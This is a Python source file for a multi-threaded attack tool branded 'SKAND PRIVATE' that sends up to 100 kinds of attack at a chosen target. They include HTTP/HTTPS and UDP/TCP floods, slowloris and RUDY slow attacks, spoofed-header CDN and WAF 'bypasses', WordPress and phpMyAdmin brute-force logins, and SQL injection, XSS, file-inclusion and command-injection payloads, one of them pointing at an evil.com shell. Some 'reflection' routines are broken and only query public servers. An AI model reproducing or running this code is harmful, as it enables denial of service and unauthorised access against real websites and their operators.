import requests
import threading
import random
import time
import os
import socket
import ssl
import http.client
import urllib.parse
import hashlib
import json
import string
from concurrent.futures import ThreadPoolExecutor

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    PURPLE = '\033[95m'
    BLUE = '\033[94m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

def clear():
    os.system('clear')

def banner():
    clear()
    print(f"""{Colors.RED}{Colors.BOLD}
    ╔══════════════════════════════════════════════════════╗
    ║                                                      ║   
    ║                 SKAND PRIVATE                        ║
    ║                                                      ║
    ╚══════════════════════════════════════════════════════╝
    {Colors.RESET}""")

class UltimateAttacker:
    def __init__(self, target, threads=500, duration=60):
        self.target = target
        self.threads = threads
        self.duration = duration
        self.count = 0
        self.ok = 0
        self.bad = 0
        self.run = False
        self.lock = threading.Lock()
        
    def resolve(self):
        try:
            hostname = self.target.split('://')[-1].split('/')[0]
            ip = socket.gethostbyname(hostname)
            return ip, hostname
        except:
            return self.target, self.target

    def random_ua(self):
        ua_list = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
            "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows NT 10.0; rv:120.0) Gecko/20100101 Firefox/120.0",
            "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
            "Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.18",
        ]
        return random.choice(ua_list)

    def _success(self):
        with self.lock:
            self.count += 1
            self.ok += 1

    def _fail(self):
        with self.lock:
            self.count += 1
            self.bad += 1

    def _send_get(self, url, headers, cookies=None):
        try:
            r = requests.get(url, headers=headers, cookies=cookies, timeout=3, verify=False)
            r.close()
            self._success()
        except:
            self._fail()

    def _send_get_ssl(self, url, headers):
        try:
            r = requests.get(url, headers=headers, timeout=3, verify=False)
            r.close()
            self._success()
        except:
            self._fail()

    def _send_post(self, url, data, headers=None):
        try:
            if headers is None:
                headers = {"User-Agent": self.random_ua()}
            r = requests.post(url, data=data, headers=headers, timeout=3, verify=False)
            r.close()
            self._success()
        except:
            self._fail()

    def _send_post_ssl(self, url, data):
        try:
            r = requests.post(url, data=data, headers={"User-Agent": self.random_ua()}, timeout=3, verify=False)
            r.close()
            self._success()
        except:
            self._fail()

    def _send_post_raw(self, url, payload, headers=None):
        try:
            if headers is None:
                headers = {"Content-Type": "application/xml"}
            r = requests.post(url, data=payload, headers=headers, timeout=3, verify=False)
            r.close()
            self._success()
        except:
            self._fail()

    def _send_post_files(self, url, files):
        try:
            r = requests.post(url, files=files, timeout=5, verify=False)
            r.close()
            self._success()
        except:
            self._fail()

    def _send_request(self, method, url, headers=None):
        try:
            if headers is None:
                headers = {"User-Agent": self.random_ua()}
            r = requests.request(method, url, headers=headers, timeout=3, verify=False)
            r.close()
            self._success()
        except:
            self._fail()

    def all_in_one(self):
        methods = [
            self.http_get_flood, self.http_post_flood, self.https_get_flood,
            self.socket_tcp_data, self.socket_udp_multi, self.slowloris_attack,
            self.cloudflare_bypass, self.wordpress_xmlrpc, self.cookie_bomb,
            self.api_endpoint_flood, self.xml_bomb, self.json_bomb
        ]
        for _ in range(random.randint(5, 15)):
            random.choice(methods)()
    
    def method_001(self): self.http_get_flood()
    def method_002(self): self.http_post_flood()
    def method_003(self): self.http_head_flood()
    def method_004(self): self.http_options_flood()
    def method_005(self): self.http_put_flood()
    def method_006(self): self.http_patch_flood()
    def method_007(self): self.http_delete_flood()
    def method_008(self): self.http_trace_flood()
    def method_009(self): self.http_connect_flood()
    def method_010(self): self.https_get_flood()
    def method_011(self): self.https_post_flood()
    def method_012(self): self.https_random_path()
    def method_013(self): self.https_null_payload()
    def method_014(self): self.https_long_url()
    def method_015(self): self.https_recursive_get()
    def method_016(self): self.socket_tcp_connect()
    def method_017(self): self.socket_tcp_data()
    def method_018(self): self.socket_tcp_keepalive()
    def method_019(self): self.socket_udp_small()
    def method_020(self): self.socket_udp_large()
    def method_021(self): self.socket_udp_multi()
    def method_022(self): self.slowloris_attack()
    def method_023(self): self.slowloris_ssl()
    def method_024(self): self.slow_read()
    def method_025(self): self.slow_post()
    def method_026(self): self.rudy_attack()
    def method_027(self): self.apache_killer()
    def method_028(self): self.nginx_stress()
    def method_029(self): self.iis_bypass()
    def method_030(self): self.wordpress_login()
    def method_031(self): self.wordpress_xmlrpc()
    def method_032(self): self.wordpress_rest_api()
    def method_033(self): self.wordpress_bruteforce()
    def method_034(self): self.joomla_stress()
    def method_035(self): self.drupal_hit()
    def method_036(self): self.magento_search()
    def method_037(self): self.phpmyadmin_brute()
    def method_038(self): self.admin_panel_finder()
    def method_039(self): self.directory_scan()
    def method_040(self): self.sql_injection_sim()
    def method_041(self): self.xss_payload_flood()
    def method_042(self): self.lfi_payload()
    def method_043(self): self.rfi_payload()
    def method_044(self): self.cmd_injection()
    def method_045(self): self.user_agent_rotate()
    def method_046(self): self.referer_spam()
    def method_047(self): self.cookie_bomb()
    def method_048(self): self.header_overflow()
    def method_049(self): self.accept_encoding_bomb()
    def method_050(self): self.cache_bypass()
    def method_051(self): self.cloudflare_bypass()
    def method_052(self): self.cloudfront_bypass()
    def method_053(self): self.akamai_bypass()
    def method_054(self): self.fastly_bypass()
    def method_055(self): self.imperva_bypass()
    def method_056(self): self.sucuri_bypass()
    def method_057(self): self.ddos_guard_bypass()
    def method_058(self): self.ovh_bypass()
    def method_059(self): self.aws_waf_bypass()
    def method_060(self): self.google_cloud_bypass()
    def method_061(self): self.api_endpoint_flood()
    def method_062(self): self.graphql_bomb()
    def method_063(self): self.rest_api_stress()
    def method_064(self): self.soap_request()
    def method_065(self): self.webdav_flood()
    def method_066(self): self.xml_bomb()
    def method_067(self): self.json_bomb()
    def method_068(self): self.form_submit_flood()
    def method_069(self): self.file_upload_sim()
    def method_070(self): self.range_header()
    def method_071(self): self.chunked_transfer()
    def method_072(self): self.gzip_bomb()
    def method_073(self): self.deflate_flood()
    def method_074(self): self.brotli_stress()
    def method_075(self): self.http2_priorities()
    def method_076(self): self.http2_settings()
    def method_077(self): self.http2_ping()
    def method_078(self): self.http2_rst()
    def method_079(self): self.websocket_stress()
    def method_080(self): self.sse_flood()
    def method_081(self): self.dns_query_flood()
    def method_082(self): self.dns_amplification()
    def method_083(self): self.ntp_reflection()
    def method_084(self): self.smtp_stress()
    def method_085(self): self.ftp_brute_sim()
    def method_086(self): self.ssh_stress()
    def method_087(self): self.telnet_flood()
    def method_088(self): self.mysql_stress()
    def method_089(self): self.postgres_stress()
    def method_090(self): self.redis_ping()
    def method_091(self): self.mongodb_stress()
    def method_092(self): self.memcached_hit()
    def method_093(self): self.elasticsearch_query()
    def method_094(self): self.kibana_search()
    def method_095(self): self.docker_api()
    def method_096(self): self.kubernetes_probe()
    def method_097(self): self.etcd_stress()
    def method_098(self): self.consul_hit()
    def method_099(self): self.zookeeper_stress()
    def method_100(self): self.all_in_one()
      
    def http_get_flood(self):
        ip, host = self.resolve()
        url = f"http://{host}/?{random.randint(0,99999)}"
        h = {"User-Agent": self.random_ua(), "Cache-Control": "no-cache", "X-Rand": str(random.randint(0,9999))}
        self._send_get(url, h)

    def http_post_flood(self):
        ip, host = self.resolve()
        url = f"http://{host}/"
        data = {"data": os.urandom(random.randint(64,1024)).hex()}
        self._send_post(url, data)

    def http_head_flood(self):
        ip, host = self.resolve()
        url = f"http://{host}/"
        self._send_request("HEAD", url)

    def http_options_flood(self):
        ip, host = self.resolve()
        url = f"http://{host}/"
        self._send_request("OPTIONS", url)

    def http_put_flood(self):
        ip, host = self.resolve()
        url = f"http://{host}/test{random.randint(0,999)}"
        self._send_request("PUT", url)

    def http_patch_flood(self):
        ip, host = self.resolve()
        url = f"http://{host}/"
        self._send_request("PATCH", url)

    def http_delete_flood(self):
        ip, host = self.resolve()
        url = f"http://{host}/test{random.randint(0,999)}"
        self._send_request("DELETE", url)

    def http_trace_flood(self):
        ip, host = self.resolve()
        url = f"http://{host}/"
        self._send_request("TRACE", url)

    def http_connect_flood(self):
        ip, host = self.resolve()
        try:
            conn = http.client.HTTPConnection(ip, 80, timeout=2)
            conn.request("CONNECT", f"{host}:443")
            conn.close()
            self._success()
        except:
            self._fail()

    def https_get_flood(self):
        ip, host = self.resolve()
        url = f"https://{host}/?{random.randint(0,99999)}"
        h = {"User-Agent": self.random_ua()}
        self._send_get_ssl(url, h)

    def https_post_flood(self):
        ip, host = self.resolve()
        url = f"https://{host}/"
        data = {"rand": os.urandom(128).hex()}
        self._send_post_ssl(url, data)

    def https_random_path(self):
        ip, host = self.resolve()
        rand_path = ''.join(random.choices(string.ascii_letters, k=random.randint(5,50)))
        url = f"https://{host}/{rand_path}"
        self._send_get_ssl(url, {"User-Agent": self.random_ua()})

    def https_null_payload(self):
        ip, host = self.resolve()
        url = f"https://{host}/"
        self._send_post_ssl(url, {})

    def https_long_url(self):
        ip, host = self.resolve()
        long_path = 'a' * random.randint(1000, 5000)
        url = f"https://{host}/{long_path}"
        self._send_get_ssl(url, {})

    def https_recursive_get(self):
        ip, host = self.resolve()
        url = f"https://{host}/"
        for _ in range(5):
            self._send_get_ssl(url, {"User-Agent": self.random_ua()})
          
    def socket_tcp_connect(self):
        ip, host = self.resolve()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            sock.connect((ip, 80))
            sock.close()
            self._success()
        except:
            self._fail()

    def socket_tcp_data(self):
        ip, host = self.resolve()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            sock.connect((ip, 80))
            sock.send(os.urandom(random.randint(512, 8192)))
            sock.close()
            self._success()
        except:
            self._fail()

    def socket_tcp_keepalive(self):
        ip, host = self.resolve()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((ip, 80))
            sock.send(f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n\r\n".encode())
            time.sleep(0.5)
            sock.send(f"X-Keep: {random.randint(0,999)}\r\n".encode())
            sock.close()
            self._success()
        except:
            self._fail()

    def socket_udp_small(self):
        ip, host = self.resolve()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(os.urandom(random.randint(64, 512)), (ip, random.choice([80,443,53,8080])))
            sock.close()
            self._success()
        except:
            self._fail()

    def socket_udp_large(self):
        ip, host = self.resolve()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(os.urandom(random.randint(10000, 60000)), (ip, 80))
            sock.close()
            self._success()
        except:
            self._fail()

    def socket_udp_multi(self):
        ip, host = self.resolve()
        for port in [80, 443, 53, 8080, 8443, random.randint(1000,9999)]:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(0.1)
                sock.sendto(os.urandom(512), (ip, port))
                sock.close()
                self._success()
            except:
                self._fail()
              
    def slowloris_attack(self):
        ip, host = self.resolve()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((ip, 80))
            sock.send(f"GET /?{random.randint(0,999)} HTTP/1.1\r\nHost: {host}\r\n".encode())
            sock.send(f"User-Agent: {self.random_ua()}\r\n".encode())
            sock.send("Connection: keep-alive\r\n".encode())
            time.sleep(random.randint(1, 5))
            sock.send(f"X-{random.randint(0,999)}: {random.randint(0,999)}\r\n".encode())
            sock.close()
            self._success()
        except:
            self._fail()

    def slowloris_ssl(self):
        ip, host = self.resolve()
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(socket.socket(socket.AF_INET), server_hostname=host)
            sock.settimeout(2)
            sock.connect((ip, 443))
            sock.send(f"GET /?{random.randint(0,999)} HTTP/1.1\r\nHost: {host}\r\n".encode())
            sock.send("Connection: keep-alive\r\n".encode())
            time.sleep(2)
            sock.send(f"Keep: {random.randint(0,999)}\r\n".encode())
            sock.close()
            self._success()
        except:
            self._fail()

    def slow_read(self):
        ip, host = self.resolve()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((ip, 80))
            sock.send(f"GET / HTTP/1.1\r\nHost: {host}\r\n\r\n".encode())
            time.sleep(0.1)
            while True:
                data = sock.recv(1)
                if not data:
                    break
                time.sleep(1)
            sock.close()
            self._success()
        except:
            self._fail()

    def slow_post(self):
        ip, host = self.resolve()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((ip, 80))
            body_size = 1000000
            sock.send(f"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: {body_size}\r\n\r\n".encode())
            for _ in range(100):
                sock.send(b'a')
                time.sleep(1)
            sock.close()
            self._success()
        except:
            self._fail()

    def rudy_attack(self):
        ip, host = self.resolve()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((ip, 80))
            sock.send(f"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 99999999\r\n\r\n".encode())
            time.sleep(1)
            sock.send(b'x')
            sock.close()
            self._success()
        except:
            self._fail()

    def apache_killer(self):
        ip, host = self.resolve()
        url = f"http://{host}/"
        h = {"Range": "bytes=0-,5-0,5-1,5-2,5-3,5-4,5-5,5-6,5-7,5-8,5-9,5-10,5-11", "Accept-Encoding": "gzip"}
        self._send_get(url, h)

    def nginx_stress(self):
        ip, host = self.resolve()
        url = f"http://{host}/"
        h = {"Accept-Encoding": "gzip,gzip,gzip,gzip", "Connection": "keep-alive,keep-alive,keep-alive"}
        self._send_get(url, h)

    def iis_bypass(self):
        ip, host = self.resolve()
        url = f"http://{host}/"
        h = {"Transfer-Encoding": "chunked", "Content-Length": "0"}
        self._send_post(url, {"data": "test"}, h)
      
    def wordpress_login(self):
        ip, host = self.resolve()
        url = f"http://{host}/wp-login.php"
        data = {"log": f"admin{random.randint(0,999)}", "pwd": os.urandom(8).hex()}
        self._send_post(url, data)

    def wordpress_xmlrpc(self):
        ip, host = self.resolve()
        url = f"http://{host}/xmlrpc.php"
        payload = f'<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'
        self._send_post_raw(url, payload)

    def wordpress_rest_api(self):
        ip, host = self.resolve()
        url = f"http://{host}/wp-json/wp/v2/users"
        self._send_get(url, {"User-Agent": self.random_ua()})

    def wordpress_bruteforce(self):
        ip, host = self.resolve()
        url = f"http://{host}/wp-login.php"
        data = {"log": "admin", "pwd": os.urandom(4).hex(), "wp-submit": "Log+In"}
        self._send_post(url, data)

    def joomla_stress(self):
        ip, host = self.resolve()
        url = f"http://{host}/index.php?option=com_search"
        self._send_get(url, {})

    def drupal_hit(self):
        ip, host = self.resolve()
        url = f"http://{host}/user/login"
        self._send_get(url, {})

    def magento_search(self):
        ip, host = self.resolve()
        url = f"http://{host}/catalogsearch/result/?q={random.randint(0,9999)}"
        self._send_get(url, {})

    def phpmyadmin_brute(self):
        ip, host = self.resolve()
        url = f"http://{host}/phpmyadmin/index.php"
        data = {"pma_username": "root", "pma_password": os.urandom(4).hex()}
        self._send_post(url, data)

    def admin_panel_finder(self):
        ip, host = self.resolve()
        paths = ["admin", "wp-admin", "administrator", "login", "cpanel", "dashboard"]
        for p in paths:
            url = f"http://{host}/{p}/"
            self._send_get(url, {"User-Agent": self.random_ua()})

    def directory_scan(self):
        ip, host = self.resolve()
        dirs = ["images", "uploads", "backup", "css", "js", "includes", "temp", "logs"]
        for d in dirs:
            url = f"http://{host}/{d}/"
            self._send_get(url, {})

    def sql_injection_sim(self):
        ip, host = self.resolve()
        payloads = ["' OR '1'='1", "' OR 1=1--", "1' AND '1'='1", "1 UNION SELECT NULL"]
        url = f"http://{host}/?id={urllib.parse.quote(random.choice(payloads))}"
        self._send_get(url, {})

    def xss_payload_flood(self):
        ip, host = self.resolve()
        payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "'><script>alert(1)</script>"]
        url = f"http://{host}/?q={urllib.parse.quote(random.choice(payloads))}"
        self._send_get(url, {})

    def lfi_payload(self):
        ip, host = self.resolve()
        payloads = ["../../etc/passwd", "../../windows/win.ini", "....//....//etc/passwd"]
        url = f"http://{host}/?file={urllib.parse.quote(random.choice(payloads))}"
        self._send_get(url, {})

    def rfi_payload(self):
        ip, host = self.resolve()
        url = f"http://{host}/?page=http://evil.com/shell.txt"
        self._send_get(url, {})

    def cmd_injection(self):
        ip, host = self.resolve()
        payloads = ["; ls", "| ls", "`ls`", "&& ls", "|| ls"]
        url = f"http://{host}/?cmd={urllib.parse.quote(random.choice(payloads))}"
        self._send_get(url, {})
      
    def user_agent_rotate(self):
        ip, host = self.resolve()
        url = f"http://{host}/"
        ua = self.random_ua()
        self._send_get(url, {"User-Agent": ua})

    def referer_spam(self):
        ip, host = self.resolve()
        refs = ["https://www.google.com/", "https://www.facebook.com/", "https://www.youtube.com/", f"https://{host}/"]
        url = f"http://{host}/"
        self._send_get(url, {"Referer": random.choice(refs)})

    def cookie_bomb(self):
        ip, host = self.resolve()
        cookies = {f"cookie{i}": os.urandom(128).hex() for i in range(random.randint(5, 20))}
        url = f"http://{host}/"
        self._send_get(url, {}, cookies)

    def header_overflow(self):
        ip, host = self.resolve()
        url = f"http://{host}/"
        h = {f"X-Header-{i}": 'A' * random.randint(1000, 5000) for i in range(random.randint(5, 20))}
        self._send_get(url, h)

    def accept_encoding_bomb(self):
        ip, host = self.resolve()
        url = f"http://{host}/"
        h = {"Accept-Encoding": ",".join(["gzip"] * 100)}
        self._send_get(url, h)

    def cache_bypass(self):
        ip, host = self.resolve()
        url = f"http://{host}/?{random.randint(0, 9999999999)}"
        h = {"Cache-Control": "no-store, no-cache, must-revalidate", "Pragma": "no-cache"}
        self._send_get(url, h)

    def cloudflare_bypass(self):
        ip, host = self.resolve()
        url = f"https://{host}/"
        h = {"User-Agent": "Mozilla/5.0", "CF-Connecting-IP": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}", "X-Forwarded-For": "127.0.0.1"}
        self._send_get_ssl(url, h)

    def cloudfront_bypass(self):
        ip, host = self.resolve()
        url = f"https://{host}/"
        h = {"X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"}
        self._send_get_ssl(url, h)

    def akamai_bypass(self):
        ip, host = self.resolve()
        url = f"https://{host}/"
        h = {"True-Client-IP": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"}
        self._send_get_ssl(url, h)

    def fastly_bypass(self):
        ip, host = self.resolve()
        url = f"https://{host}/"
        h = {"Fastly-Client-IP": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"}
        self._send_get_ssl(url, h)

    def imperva_bypass(self):
        ip, host = self.resolve()
        url = f"https://{host}/"
        h = {"X-Forwarded-For": "127.0.0.1, 10.0.0.1", "X-Client-IP": "10.0.0.1"}
        self._send_get_ssl(url, h)

    def sucuri_bypass(self):
        ip, host = self.resolve()
        url = f"https://{host}/"
        h = {"X-Sucuri-ID": "1"}
        self._send_get_ssl(url, h)

    def ddos_guard_bypass(self):
        ip, host = self.resolve()
        url = f"https://{host}/"
        h = {"X-Forwarded-For": "1.1.1.1"}
        self._send_get_ssl(url, h)

    def ovh_bypass(self):
        ip, host = self.resolve()
        url = f"http://{host}/"
        self._send_get(url, {"User-Agent": "OVH-Status/v1.0"})

    def aws_waf_bypass(self):
        ip, host = self.resolve()
        url = f"https://{host}/"
        h = {"X-Forwarded-For": "169.254.169.254"}
        self._send_get_ssl(url, h)

    def google_cloud_bypass(self):
        ip, host = self.resolve()
        url = f"https://{host}/"
        h = {"X-Forwarded-For": "metadata.google.internal"}
        self._send_get_ssl(url, h)

    def api_endpoint_flood(self):
        ip, host = self.resolve()
        endpoints = ["/api/v1/users", "/api/v1/products", "/api/v1/orders", "/api/auth", "/api/login"]
        for ep in endpoints:
            url = f"http://{host}{ep}"
            self._send_get(url, {})

    def graphql_bomb(self):
        ip, host = self.resolve()
        url = f"http://{host}/graphql"
        query = {"query": "{ __schema { types { name } } }"}
        self._send_post(url, query)

    def rest_api_stress(self):
        ip, host = self.resolve()
        url = f"http://{host}/wp-json/wp/v2/posts?per_page=100"
        self._send_get(url, {})

    def soap_request(self):
        ip, host = self.resolve()
        url = f"http://{host}/webservice/"
        payload = '<soap:Envelope><soap:Body/></soap:Envelope>'
        self._send_post_raw(url, payload, {"Content-Type": "text/xml"})

    def webdav_flood(self):
        ip, host = self.resolve()
        url = f"http://{host}/"
        self._send_request("PROPFIND", url)

    def xml_bomb(self):
        ip, host = self.resolve()
        url = f"http://{host}/"
        payload = '<?xml version="1.0"?>' + '<a>' * 10000 + '</a>' * 10000
        self._send_post_raw(url, payload)

    def json_bomb(self):
        ip, host = self.resolve()
        url = f"http://{host}/api"
        data = {"data": "x" * 100000}
        self._send_post(url, data)

    def form_submit_flood(self):
        ip, host = self.resolve()
        url = f"http://{host}/contact"
        data = {"name": "x" * 1000, "email": f"test{random.randint(0,999)}@test.com", "message": "x" * 10000}
        self._send_post(url, data)

    def file_upload_sim(self):
        ip, host = self.resolve()
        url = f"http://{host}/upload"
        files = {"file": ("test.txt", os.urandom(100000))}
        self._send_post_files(url, files)

    def range_header(self):
        ip, host = self.resolve()
        url = f"http://{host}/"
        h = {"Range": f"bytes=0-{random.randint(0, 999999)}"}
        self._send_get(url, h)

    def chunked_transfer(self):
        ip, host = self.resolve()
        try:
            conn = http.client.HTTPConnection(ip, 80, timeout=2)
            conn.putrequest("POST", "/")
            conn.putheader("Host", host)
            conn.putheader("Transfer-Encoding", "chunked")
            conn.endheaders()
            for _ in range(100):
                size = random.randint(100, 10000)
                conn.send(f"{size:X}\r\n".encode())
                conn.send(os.urandom(size))
                conn.send(b"\r\n")
            conn.send(b"0\r\n\r\n")
            conn.close()
            self._success()
        except:
            self._fail()

    def gzip_bomb(self):
        ip, host = self.resolve()
        url = f"http://{host}/"
        h = {"Accept-Encoding": "gzip, deflate"}
        self._send_get(url, h)

    def deflate_flood(self):
        ip, host = self.resolve()
        url = f"http://{host}/"
        h = {"Accept-Encoding": "deflate"}
        self._send_get(url, h)

    def brotli_stress(self):
        ip, host = self.resolve()
        url = f"http://{host}/"
        h = {"Accept-Encoding": "br"}
        self._send_get(url, h)

    def http2_priorities(self):
        ip, host = self.resolve()
        try:
            conn = http.client.HTTPSConnection(ip, 443, timeout=2)
            conn.request("GET", "/", headers={"User-Agent": "Mozilla/5.0"})
            conn.close()
            self._success()
        except:
            self._fail()

    def http2_settings(self):
        ip, host = self.resolve()
        try:
            conn = http.client.HTTPSConnection(ip, 443, timeout=2)
            conn.request("GET", "/", headers={"Connection": "Upgrade", "Upgrade": "h2c"})
            conn.close()
            self._success()
        except:
            self._fail()

    def http2_ping(self):
        self.https_get_flood()

    def http2_rst(self):
        self.https_get_flood()

    def websocket_stress(self):
        ip, host = self.resolve()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((ip, 80))
            sock.send(f"GET / HTTP/1.1\r\nHost: {host}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n\r\n".encode())
            sock.close()
            self._success()
        except:
            self._fail()

    def sse_flood(self):
        ip, host = self.resolve()
        url = f"http://{host}/"
        h = {"Accept": "text/event-stream"}
        self._send_get(url, h)
      
    def dns_query_flood(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(os.urandom(64), ("8.8.8.8", 53))
            sock.close()
            self._success()
        except:
            self._fail()

    def dns_amplification(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            query = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01'
            sock.sendto(query, ("8.8.8.8", 53))
            sock.close()
            self._success()
        except:
            self._fail()

    def ntp_reflection(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(b'\x17\x00\x03\x2a' + b'\x00' * 44, ("pool.ntp.org", 123))
            sock.close()
            self._success()
        except:
            self._fail()

    def smtp_stress(self):
        ip, host = self.resolve()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((ip, 25))
            sock.send(b"EHLO test.com\r\n")
            sock.close()
            self._success()
        except:
            self._fail()

    def ftp_brute_sim(self):
        ip, host = self.resolve()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((ip, 21))
            sock.send(f"USER admin\r\nPASS {os.urandom(4).hex()}\r\n".encode())
            sock.close()
            self._success()
        except:
            self._fail()

    def ssh_stress(self):
        ip, host = self.resolve()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((ip, 22))
            sock.send(os.urandom(random.randint(64, 512)))
            sock.close()
            self._success()
        except:
            self._fail()

    def telnet_flood(self):
        ip, host = self.resolve()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((ip, 23))
            sock.send(os.urandom(random.randint(64, 512)))
            sock.close()
            self._success()
        except:
            self._fail()

    def mysql_stress(self):
        ip, host = self.resolve()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((ip, 3306))
            sock.send(os.urandom(64))
            sock.close()
            self._success()
        except:
            self._fail()

    def postgres_stress(self):
        ip, host = self.resolve()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((ip, 5432))
            sock.send(os.urandom(64))
            sock.close()
            self._success()
        except:
            self._fail()

    def redis_ping(self):
        ip, host = self.resolve()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((ip, 6379))
            sock.send(b"PING\r\n")
            sock.close()
            self._success()
        except:
            self._fail()

    def mongodb_stress(self):
        ip, host = self.resolve()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((ip, 27017))
            sock.send(os.urandom(128))
            sock.close()
            self._success()
        except:
            self._fail()

    def memcached_hit(self):
        ip, host = self.resolve()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((ip, 11211))
            sock.send(b"stats\r\n")
            sock.close()
            self._success()
        except:
            self._fail()

    def elasticsearch_query(self):
        ip, host = self.resolve()
        url = f"http://{host}:9200/_search?q={random.randint(0,9999)}"
        self._send_get(url, {})

    def kibana_search(self):
        ip, host = self.resolve()
        url = f"http://{host}:5601/api/saved_objects/_find?type=index-pattern"
        self._send_get(url, {})

    def docker_api(self):
        ip, host = self.resolve()
        url = f"http://{host}:2375/containers/json"
        self._send_get(url, {})

    def kubernetes_probe(self):
        ip, host = self.resolve()
        url = f"http://{host}:10250/metrics"
        self._send_get(url, {})

    def etcd_stress(self):
        ip, host = self.resolve()
        url = f"http://{host}:2379/version"
        self._send_get(url, {})

    def consul_hit(self):
        ip, host = self.resolve()
        url = f"http://{host}:8500/v1/catalog/services"
        self._send_get(url, {})

    def zookeeper_stress(self):
        ip, host = self.resolve()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((ip, 2181))
            sock.send(b"stat")
            sock.close()
            self._success()
        except:
            self._fail()

    def monitor(self):
        start = time.time()
        while self.run:
            elapsed = time.time() - start
            pps = self.count / elapsed if elapsed > 0 else 0
            success_rate = (self.ok / self.count * 100) if self.count > 0 else 0
            print(f"\r{Colors.CYAN}[*] Paket: {self.count:,} | Hiz: {pps:,.0f} pps | Basari: %{success_rate:.1f} | {elapsed:.0f}s{Colors.RESET}", end='')
            time.sleep(0.3)

    def start(self, method_number=None):
        self.run = True
        ip, host = self.resolve()
        
        print(f"\n{Colors.RED}{Colors.BOLD}[!] SKAND PRIVATE BASLATILDI!{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Hedef: {host}")
        print(f"[*] IP: {ip}")
        print(f"[*] Thread: {self.threads}")
        print(f"[*] Sure: {self.duration}s")
        if method_number:
            print(f"[*] Metod: {method_number}{Colors.RESET}\n")
        else:
            print(f"[*] Metod: KARISIK{Colors.RESET}\n")
        
        time.sleep(0.5)
        
        if method_number and 1 <= method_number <= 100:
            method_name = f"method_{method_number:03d}"
            attack_func = getattr(self, method_name, self.all_in_one)
        else:
            attack_func = self.all_in_one
        
        monitor_thread = threading.Thread(target=self.monitor, daemon=True)
        monitor_thread.start()
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(attack_func) for _ in range(self.threads)]
            time.sleep(self.duration)
            self.run = False
            for f in futures:
                f.cancel()
        
